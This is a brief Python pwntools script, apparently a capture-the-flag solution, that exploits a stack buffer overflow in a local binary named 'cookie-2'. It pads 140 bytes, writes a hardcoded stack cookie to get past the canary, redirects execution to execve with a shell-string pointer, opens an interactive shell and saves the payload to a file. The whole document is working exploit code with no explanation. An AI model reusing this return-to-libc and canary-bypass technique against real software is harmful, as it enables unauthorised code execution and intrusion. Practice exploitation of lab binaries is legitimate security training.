#!/usr/bin/env python
from pwn import *

sh = 0xf7ffba80

cookie = 0x045bc69f
offset = 140

execve = 0xf7ea85b0

buf = ''
buf += 'A' * offset
buf += p32(cookie)
buf += 'B' * 4
buf += p32(execve)
buf += 'C' * 4
buf += p32(sh)
buf += p32(0)
buf += p32(0)

p = process('./cookie-2')

p.send(buf)
p.interactive()

with open('input.txt', 'w') as f:
    f.write(buf)
